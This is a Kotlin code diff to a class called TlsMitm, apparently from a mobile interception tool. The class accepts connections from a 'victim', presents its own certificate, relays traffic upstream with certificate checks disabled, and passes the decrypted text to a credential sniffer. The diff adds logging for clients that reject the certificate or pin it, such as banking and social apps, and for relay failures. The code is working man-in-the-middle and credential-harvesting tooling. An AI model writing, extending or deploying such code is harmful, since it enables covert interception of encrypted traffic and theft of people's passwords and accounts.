@@ -88,6 +88,7 @@ class TlsMitm {
     private fun handle(raw: Socket) {
         var victim: SSLSocket? = null
         var upstream: SSLSocket? = null
+        var sni: String? = null
         try {
             val ctx = serverCtx ?: return
             val matcher = CapturingSNIMatcher()
@@ -104,19 +105,27 @@ class TlsMitm {
                 vs.startHandshake()
             } catch (t: Throwable) {
                 // The client parsed our ClientHello (so we know the SNI) but refused our cert:
-                // this is a pinned / cert-validating app (banking, Facebook, Instagram, ...).
-                // Surface it honestly instead of a silent drop, so the user sees WHY.
-                matcher.host?.let { onLine?.invoke("[TLS] $it — pinned/validating client, cannot decrypt") }
+                // this is a pinned / cert-validating app (banking, Facebook, Instagram, ...) that
+                // does NOT trust our CA. Surface it honestly instead of a silent drop.
+                val h = matcher.host
+                if (h != null) onLine?.invoke("[TLS] $h — client rejected our cert (install our CA, or it's pinned)")
+                else onLine?.invoke("[TLS] client dropped before SNI (${t.javaClass.simpleName})")
                 vs.close(); return
             }
             raw.soTimeout = 0
-            val host = matcher.host ?: run { vs.close(); return }
+            val host = matcher.host ?: run { onLine?.invoke("[TLS] no SNI in ClientHello — cannot route"); vs.close(); return }
+            sni = host
 
             // upstream: connect with a timeout, then layer TLS over the connected socket
             val up = SSLContext.getInstance("TLS")
             up.init(null, trustAll, null)
             val plain = Socket()
-            plain.connect(InetSocketAddress(host, 443), CONNECT_TIMEOUT_MS)
+            try {
+                plain.connect(InetSocketAddress(host, 443), CONNECT_TIMEOUT_MS)
+            } catch (t: Throwable) {
+                onLine?.invoke("[TLS] $host — upstream unreachable (${t.javaClass.simpleName})")
+                closeQuiet(plain); vs.close(); return
+            }
             val us = up.socketFactory.createSocket(plain, host, 443, true) as SSLSocket
             upstream = us
             val upp = us.getSSLParameters()
@@ -142,8 +151,9 @@ class TlsMitm {
                 for (cred in CredSniffer.scanText(host, text)) onLine?.invoke(cred)
                 uOut.write(buf, 0, n); uOut.flush()
             }
-        } catch (_: Throwable) {
-            // handshake failed (pinned/validating client) or connection error
+        } catch (t: Throwable) {
+            // upstream TLS handshake or relay failure after we already answered the victim
+            onLine?.invoke("[TLS] ${sni ?: "?"} — relay failed (${t.javaClass.simpleName}: ${t.message ?: "-"})")
         } finally {
             closeQuiet(victim); closeQuiet(upstream); closeQuiet(raw)
         }
